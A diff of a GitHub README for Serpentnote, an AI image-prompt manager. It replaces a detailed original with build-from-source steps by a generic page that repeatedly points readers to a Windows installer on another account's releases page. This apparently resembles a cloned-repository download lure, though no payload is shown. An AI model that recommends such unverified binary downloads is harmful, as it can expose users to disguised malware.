@@ -1,264 +1,87 @@
-If you want to support my work, you can check out my [Ko-Fi](https://ko-fi.com/lunarsoda69)
+# 🎨 Serpentnote - Save and Create Prompts Easily
 
-# Serpentnote - AI Image Prompt Library
-<img width="1920" height="1033" alt="electron_5ABoiHC2h6" src="https://github.com/user-attachments/assets/f28c7bfe-e0ba-4558-b6a9-5351949c1020" />
-
-**Your personal command center for AI art generation workflows.**
-
-Serpentnote is a powerful visual prompt management tool designed for serious AI artists and content creators. Stop losing track of your best prompts—organize, refine, and reuse them across Stable Diffusion, Midjourney, ComfyUI, and any other AI art generator.
-
-## ✨ What Makes Serpentnote Special
-
-### 🎯 **Channel-Based Organization**
-Create themed collections with custom names and emojis—think "Cyberpunk Portraits 🌆", "Fantasy Landscapes 🏔️", or "Product Shots 📸". Each channel stores its own prompts, tags, and reference images.
-<img width="1919" height="982" alt="electron_noS5RFFSTR" src="https://github.com/user-attachments/assets/9ddd9cd5-a74e-40ce-96ac-51e39feb9a5f" />
-### 🎨 **Dual Prompt System**
-Master prompt engineering with separate **positive prompts** (what you want) and **negative prompts** (what to avoid). Perfect for fine-tuning Stable Diffusion outputs.
-
-<img width="653" height="959" alt="electron_odjuCXfmaE" src="https://github.com/user-attachments/assets/006a6a45-8076-4e7b-9cf1-478f7681d213" />
-
-### 🏷️ **Smart Tag Library**
-Build reusable tag collections that instantly modify prompts without rewriting. Mix and match quality settings, art styles, camera angles, and lighting conditions.
-
-### 🎪 **Danbooru Tag Autocomplete**
-Access 650+ professional AI art tags with intelligent autocomplete:
-- Quality modifiers: `masterpiece`, `best quality`, `highly detailed`
-- Art styles: `anime`, `photorealistic`, `oil painting`, `3d render`
-- Lighting: `dramatic lighting`, `golden hour`, `studio lighting`
-- Camera angles: `portrait`, `wide shot`, `from below`, `fisheye`
-- And much more...
-
-- <img width="561" height="323" alt="electron_NCRyA8mJff" src="https://github.com/user-attachments/assets/85e8f77f-6345-4fe5-85c3-44a696fb2b4c" />
-
-### 📸 **Visual Reference Gallery**
-Attach unlimited reference images to each channel. Track what worked, compare variations, and build a visual library of your successful generations.
-
-### ⭐ **Star & Sort System**
-Bookmark your best-performing prompts and organize channels with drag-and-drop reordering. Your workflow, your way.
-
-### 💾 **Import/Export Everything**
-Backup your entire prompt library or share collections with your team. Perfect for collaboration or migrating between machines.
-
-<img width="551" height="340" alt="electron_vEy8cwZDWh" src="https://github.com/user-attachments/assets/7ea5b58b-ba7e-4e4d-b344-56f295e0a0f4" />
-
-### 🌍 **Multi-Language Interface**
-Work in your preferred language: English, Spanish, French, German, Japanese, or Chinese.
-
-## 🎯 Perfect For
-
-- **AI Artists** building a comprehensive prompt library
-- **Content Creators** managing multiple image generation projects
-- **Creative Teams** collaborating on AI art workflows
-- **Prompt Engineers** experimenting with variations and refinements
-- **Anyone** tired of losing track of their best prompts in scattered text files
+## 🌟 Introduction
+Serpentnote is a user-friendly tool designed to help you manage your prompts for artificial intelligence models. With Serpentnote, you can save your prompts privately, and also explore new ways to generate them. Whether you are diving into models like Illustrious XL, Chroma, or Z-Image Turbo, this app serves as your personal space for creativity.
 
 ## 🚀 Getting Started
+To get started with Serpentnote, follow these simple steps:
 
-### Browser Version (Quick Start)
-1. Open `index.html` in your browser
-2. Everything runs locally—no server required
-3. Data stored in browser LocalStorage (5-10MB limit)
-4. Perfect for small collections and testing
+1. **Download the Application:**
+   Click the button below to visit the releases page and download the latest version of Serpentnote.
 
-### Electron Version (Recommended)
+   [![Download Serpentnote](https://img.shields.io/badge/Download%20Serpentnote-v1.0-blue)](https://github.com/huzshaz/Serpentnote/releases)
 
-**Why Electron?**
-- ✅ Unlimited storage capacity
-- ✅ Faster performance with large libraries
-- ✅ File-based storage—images accessible in your file explorer
-- ✅ Desktop app experience with system integration
+2. **Install the Application:**
+   After downloading, locate the downloaded file on your computer. Double-click the file to start the installation process. Follow the prompts on your screen to successfully install Serpentnote.
 
-#### Installation
+## 📁 Download & Install
+To download Serpentnote, visit this page: [Download Serpentnote](https://github.com/huzshaz/Serpentnote/releases). Here, you’ll find the latest release files. Choose the file for your operating system (Windows 10 or Windows 11) and click to download. Simply follow the on-screen instructions after the download to complete the installation.
 
-**Prerequisites:**
-- Node.js (v16 or higher)
-- npm (comes with Node.js)
+## 🖥️ System Requirements
+Make sure your computer meets these requirements to run Serpentnote smoothly:
 
-**Setup Steps:**
+- **Operating System:** Windows 10 or Windows 11
+- **RAM:** 4 GB or more
+- **Processor:** Intel i3 or equivalent
+- **Disk Space:** 100 MB free space for installation and data
 
-1. **Install dependencies:**
-   ```bash
-   npm install
-   ```
+## ✨ Features
+Serpentnote comes packed with useful features, including:
 
-2. **Run in development mode:**
-   ```bash
-   npm run dev
-   ```
-   This compiles TypeScript and launches the Electron app.
+- **Prompt Storage:** Keep all your favorite prompts organized and accessible in one place.
+- **Creation Tool:** Generate new prompts with ease, helping you to expand your creativity.
+- **Easy Navigation:** The user-friendly interface guides you effortlessly through the app.
 
-3. **Build distributable app:**
-   ```bash
-   npm run package
-   ```
-   Creates installers in `dist/` folder:
-   - **Windows**: `.exe` installer
-   - **macOS**: `.dmg` installer
-   - **Linux**: `.AppImage` file
+## 🛠️ How to Use
+Once you have installed Serpentnote, follow these steps to make the most out of the application:
 
-**Platform-specific builds:**
-```bash
-npm run package -- --win   # Windows only
-npm run package -- --mac   # macOS only
-npm run package -- --linux # Linux only
-```
+1. **Open Serpentnote:**
+   Locate the Serpentnote icon on your desktop or in your applications folder. Double-click to launch the app.
 
-#### First Launch
+2. **Saving a Prompt:**
+   - Click on "New Prompt."
+   - Enter your prompt in the text area.
+   - Click "Save" to store it in the application.
 
-On first launch, Serpentnote automatically creates a `serpentnote-data` folder in the app's root directory:
+3. **Creating a New Prompt:**
+   - Select "Create Prompt" from the main menu.
+   - Use the tools provided to help generate unique prompts based on your needs.
+   - Save your creation for future use.
 
-```
-serpentnote-app/
-└── serpentnote-data/
-    ├── channels.json           # Channel metadata & prompts
-    ├── tags.json              # Your tag library
-    ├── customDanbooruTags.json # Custom Danbooru tags
-    └── images/                # All uploaded images
-        ├── image-1.png
-        ├── image-2.jpg
-        └── ...
-```
+4. **Viewing Saved Prompts:**
+   - Click on "My Prompts" to see all your saved entries.
+   - You can edit or delete any prompt as needed.
 
-**Storage Tips:**
-- Images are stored in full quality as separate files
-- Your prompt library grows with your creativity—no artificial limits
-- Easy to backup: just copy the `serpentnote-data` folder
-- Images accessible via file explorer for external editing
+## 📄 Contribution
+Though Serpentnote is designed for end-users, we welcome improvement suggestions. If you have ideas for features or find bugs, feel free to reach out via the Issues section of our GitHub page.
 
-## 📖 Usage Guide
+## 💬 Support
+For any support inquiries, please refer to our GitHub page for common questions and answers. If you cannot find your answers, open an issue under the “Support” category, and our team will assist you as soon as possible.
 
-### Creating Your First Channel
+## 🪄 License
+Serpentnote is licensed under the MIT License. You may use, modify, and distribute it freely, provided that you include the original license in your distributed works.
 
-1. Click the **"+"** button in the sidebar
-2. Name your channel (e.g., "Cyberpunk Portraits")
-3. Choose an emoji icon (🌆)
-4. Write your positive prompt:
-   ```
-   cyberpunk woman, neon lights, rain, detailed face, futuristic
-   ```
-5. Add negative prompt:
-   ```
-   blurry, low quality, distorted, ugly
-   ```
-6. Add reusable tags: `masterpiece`, `4k`, `dramatic lighting`
+## 🤖 Topics
+Serpentnote covers a variety of topics that enhance your experience:
 
-### Uploading Reference Images
+- ai
+- artificial-intelligence
+- diffusion-models
+- electron
+- flux
+- flux2
+- illustrious
+- image-generation
+- pony-diffusion
+- sd
+- sd15
+- sdxl
+- stable-diffusion
+- stable-diffusion-xl-1
+- windows
+- windows-10
+- windows-11
+- z-image
+- z-image-turbo
 
-**Three ways to add images:**
-
-1. **Drag & Drop** - Drag images from your desktop into the gallery area
-2. **Click to Upload** - Double-click the gallery area to open file picker
-3. **Paste** - Copy an image and paste it directly (Ctrl/Cmd + V)
-
-Images automatically inherit the channel's prompts and tags as metadata.
-
-### Working with Tags
-
-**Create Tag Collections:**
-- Click hamburger menu ☰ → "Manage Tags"
-- Add tags with emoji support: `✨ masterpiece`, `🎨 oil painting`
-- Tags apply to all images in the channel
-
-**Built-in Danbooru Tags:**
-- Start typing in the prompt field
-- Autocomplete suggests professional AI art tags
-- Add custom tags: Settings → "Manage Danbooru Tags"
-
-### Organizing Channels
-
-- **Star Channels** - Click the ⭐ icon to mark favorites
-- **Drag to Reorder** - Click and drag channels in the sidebar
-- **Filter by Tags** - Use the filter bar to show specific tags
-- **Search** - Type to find channels by name or prompt content
-
-### Backup & Restore
-
-**Export Everything:**
-1. Click hamburger menu ☰
-2. Select "Export All Data"
-3. Choose format:
-   - **JSON** - Full backup with all metadata
-   - **Danbooru** - Tag list for external tools
-
-**Import Data:**
-1. Hamburger menu → "Import Data"
-2. Select your exported JSON file
-3. Data merges with existing library (or replaces if empty)
-
-### Keyboard Shortcuts
-
-| Shortcut | Action |
-|----------|--------|
-| `Ctrl/Cmd + N` | New channel |
-| `Ctrl/Cmd + E` | Export data |
-| `Ctrl/Cmd + Z` | Undo |
-| `Ctrl/Cmd + Y` | Redo |
-| `Delete` | Delete current image |
-| `Esc` | Close modals |
-
-## 🛠️ Troubleshooting
-
-### App won't start
-- Verify Node.js: `node --version` (should be v16+)
-- Reinstall dependencies: `rm -rf node_modules && npm install`
-- Try: `npm run build:js` then `npm start`
-
-### Images not loading
-- Check `serpentnote-data/images/` folder exists
-- Verify file permissions (should be read/write)
-- Look for errors in DevTools (Ctrl+Shift+I)
-
-### Storage Issues
-- **Browser version**: Hit LocalStorage limit? Switch to Electron
-- **Electron version**: Images stored in `./serpentnote-data/images/`
-- Check disk space—large libraries need room to grow
-
-### Clearing Data
-Settings → Data Management → "Clear All Data" (warning: irreversible!)
-
-## 🔧 Development
-
-### Project Structure
-```
-serpentnote/
-├── main.ts              # Main app logic (TypeScript)
-├── main.js             # Compiled JavaScript
-├── index.html          # HTML structure
-├── style.css           # All styles
-├── electron-main.js    # Electron main process
-├── preload.js          # IPC bridge (security)
-└── package.json        # Dependencies & scripts
-```
-
-### Build Commands
-```bash
-npm run build:js        # Compile TypeScript
-npm run dev            # Dev mode with hot reload
-npm start              # Run without recompiling
-npm run package        # Build distributable app
-```
-
-## 🌐 Technology
-
-**Built with:**
-- TypeScript for type safety
-- Electron for desktop app
-- LocalStorage/File System for data persistence
-- Zero backend—complete privacy for your creative work
-
-**No cloud, no tracking, no subscriptions.** Your prompts stay yours.
-
-## 📄 License
-
-MIT License - Free to use, modify, and distribute
-
-## 💖 Credits
-
-- Built with Electron & TypeScript
-- Icons from Heroicons
-- Emoji rendering by Twemoji
-- Danbooru tag database from community contributions
-
----
-
-**Made with ❤️ for AI artists who take their craft seriously.**
+Make your prompt exploration exciting with Serpentnote. Visit the [Download page](https://github.com/huzshaz/Serpentnote/releases) to start your journey today!
